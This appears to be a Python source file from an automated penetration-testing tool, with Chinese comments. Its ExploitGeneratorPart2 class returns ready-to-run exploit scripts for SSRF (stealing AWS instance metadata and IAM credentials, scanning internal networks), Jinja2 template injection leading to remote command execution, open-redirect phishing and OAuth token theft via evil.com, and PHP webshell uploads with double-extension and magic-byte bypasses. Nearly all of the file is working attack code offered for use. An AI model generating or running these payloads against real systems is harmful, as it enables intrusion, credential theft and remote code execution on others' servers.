"""
security/oob_detector.py - 带外检测(OOB)与利用代码生成器

核心能力：
- DNS回调检测（验证盲SSRF、盲XXE、盲命令注入）
- HTTP回调检测（验证盲漏洞）
- 利用代码生成器（根据漏洞类型生成PoC/Exploit）
- 支持SQL注入、XSS、命令注入、SSRF、目录遍历、文件上传等漏洞类型
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import threading
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict


# ================================================================
# 数据结构
# ================================================================
from .oob_channel_type import *  # noqa: F401,F403
from .core import *  # noqa: F401,F403
from .methods_1 import *  # noqa: F401,F403

class ExploitGeneratorPart2(object):
    def _ssrf_poc_template(self, vuln: Dict):
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "url")
        code = f'''#!/usr/bin/env python3
"""SSRF PoC - {url}"""
import requests

url = "{url}"
param = "{param}"

def test():
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
    ]
    for payload in payloads:
        try:
            resp = requests.get(url, params={{param: payload}}, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"[+] 可能存在SSRF! Payload: {{payload}}")
                print(f"[+] 响应长度: {{len(resp.text)}}")
                print(f"[+] 响应内容: {{resp.text[:200]}}")
        except Exception as e:
            print(f"[!] {{payload}}: {{e}}")

if __name__ == "__main__":
    test()
'''
        return code, f"SSRF PoC - {url}", ["requests"], "python3 ssrf_poc.py"
    def _ssrf_exploit_template(self, vuln: Dict):
        code = '''#!/usr/bin/env python3
"""SSRF利用 - 云元数据窃取和内网扫描"""
import requests
import sys

def steal_aws_metadata(url, param):
    endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/instance-id",
    ]
    for ep in endpoints:
        resp = requests.get(url, params={param: ep}, timeout=10)
        print(f"[+] {ep}: {resp.text[:300]}")

def scan_internal(url, param, network, ports):
    for i in range(1, 255):
        target = f"http://{network}.{i}:{ports[0]}"
        try:
            resp = requests.get(url, params={param: target}, timeout=3)
            if resp.status_code == 200:
                print(f"[+] 发现内网服务: {target}")
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("用法: python3 ssrf_exploit.py <url> <param>")
        sys.exit(1)
    steal_aws_metadata(sys.argv[1], sys.argv[2])
'''
        return code, "SSRF利用 - 云元数据和内网扫描", ["requests"], "python3 ssrf_exploit.py url param"
    def _ssti_poc_template(self, vuln: Dict):
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "name")
        code = f'''#!/usr/bin/env python3
"""SSTI PoC - {url}"""
import requests

url = "{url}"
param = "{param}"

def test():
    payloads = [
        ("{{{{7*7}}}}", "49", "Jinja2/Twig"),
        ("${{7*7}}", "49", "EL表达式"),
        ("#{{7*7}}", "49", "JSP EL"),
        ("<%= 7*7 %>", "49", "JSP"),
        ("{{{{config}}}}", "", "Jinja2配置对象"),
    ]
    for payload, expected, engine in payloads:
        resp = requests.get(url, params={{param: payload}}, timeout=10)
        if expected and expected in resp.text:
            print(f"[+] 确认SSTI ({{engine}})! Payload: {{payload}}")
            return True
        elif not expected and "Config" in resp.text:
            print(f"[+] 确认Jinja2 SSTI! Payload: {{payload}}")
            return True
    print("[-] 未确认SSTI")
    return False

if __name__ == "__main__":
    test()
'''
        return code, f"SSTI PoC - {url}", ["requests"], "python3 ssti_poc.py"
    def _ssti_exploit_template(self, vuln: Dict):
        code = '''#!/usr/bin/env python3
"""SSTI利用 - Jinja2 RCE"""
import requests
import sys

def jinja2_rce(url, param, cmd):
    payload = (
        "{% import os %}"
        "{{ os.popen('" + cmd + "').read() }}"
    )
    resp = requests.get(url, params={param: payload}, timeout=10)
    return resp.text

def jinja2_rce_advanced(url, param, cmd):
    # 通过类继承链执行命令
    payload = (
        "{{ ''.__class__.__mro__[1].__subclasses__()"
        "[408]('" + cmd + "', shell=True, stdout=-1).communicate()[0] }}"
    )
    resp = requests.get(url, params={param: payload}, timeout=10)
    return resp.text

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("用法: python3 ssti_exploit.py <url> <param> <command>")
        sys.exit(1)
    result = jinja2_rce(sys.argv[1], sys.argv[2], sys.argv[3])
    print(result)
'''
        return code, "SSTI利用 - Jinja2 RCE", ["requests"], "python3 ssti_exploit.py url param command"
    def _redirect_poc_template(self, vuln: Dict):
        url = vuln.get("url", "http://target.com/page")
        param = vuln.get("injection_point", {}).get("name", "redirect")
        code = f'''#!/usr/bin/env python3
"""开放重定向PoC - {url}"""
import requests

url = "{url}"
param = "{param}"

def test():
    payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\\\evil.com",
        "https:evil.com",
        "https://evil.com%23@example.com",
    ]
    for payload in payloads:
        try:
            resp = requests.get(url, params={{param: payload}}, allow_redirects=False, timeout=10)
            if resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    print(f"[+] 确认开放重定向! Payload: {{payload}}")
                    print(f"[+] Location: {{location}}")
                    return True
        except Exception as e:
            print(f"[!] {{e}}")
    print("[-] 未确认开放重定向")
    return False

if __name__ == "__main__":
    test()
'''
        return code, f"开放重定向PoC - {url}", ["requests"], "python3 redirect_poc.py"
    def _redirect_exploit_template(self, vuln: Dict):
        code = '''#!/usr/bin/env python3
"""开放重定向利用 - 钓鱼和OAuth令牌窃取"""
import sys

def generate_phishing_url(vuln_url, param, phish_url):
    return f"{vuln_url}?{param}={phish_url}"

def generate_oauth_theft(auth_url, redirect_param, callback_url):
    return f"{auth_url}&{redirect_param}={callback_url}"

if __name__ == "__main__":
    print("[*] 开放重定向利用工具")
    print("[*] 生成钓鱼URL:")
    print(generate_phishing_url(
        "http://target.com/redirect",
        "url",
        "https://evil-login.com"
    ))
'''
        return code, "开放重定向利用 - 钓鱼", [], "python3 redirect_exploit.py"
    def _upload_poc_template(self, vuln: Dict):
        url = vuln.get("url", "http://target.com/upload")
        code = f'''#!/usr/bin/env python3
"""文件上传PoC - {url}"""
import requests

url = "{url}"

def test():
    # 测试PHP webshell上传
    files = {{"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")}}
    resp = requests.post(url, files=files, timeout=10)
    print(f"[+] 响应状态: {{resp.status_code}}")
    print(f"[+] 响应内容: {{resp.text[:300]}}")

    # 测试双扩展名
    files2 = {{"file": ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg")}}
    resp2 = requests.post(url, files=files2, timeout=10)
    print(f"[+] 双扩展名响应: {{resp2.status_code}}")

if __name__ == "__main__":
    test()
'''
        return code, f"文件上传PoC - {url}", ["requests"], "python3 upload_poc.py"
    def _upload_exploit_template(self, vuln: Dict):
        code = '''#!/usr/bin/env python3
"""文件上传利用 - Webshell和绕过"""
import requests
import sys

def upload_webshell(url, field="file", filename="shell.php"):
    webshell = '<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>'
    files = {field: (filename, webshell, "application/octet-stream")}
    resp = requests.post(url, files=files, timeout=30)
    return resp

def upload_with_magic_bytes(url, field="file", filename="shell.php"):
    # GIF89a魔术字节 + PHP代码
    webshell = b"GIF89a<?php system($_GET['cmd']); ?>"
    files = {field: (filename, webshell, "image/gif")}
    resp = requests.post(url, files=files, timeout=30)
    return resp

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python3 upload_exploit.py <upload_url>")
        sys.exit(1)
    print("[*] 上传Webshell...")
    resp = upload_webshell(sys.argv[1])
    print(f"[+] 响应: {resp.status_code}")
    print(resp.text[:500])
'''
        return code, "文件上传利用 - Webshell", ["requests"], "python3 upload_exploit.py url"
    def get_supported_types(self) -> List[str]:
        return list(self.templates.keys())
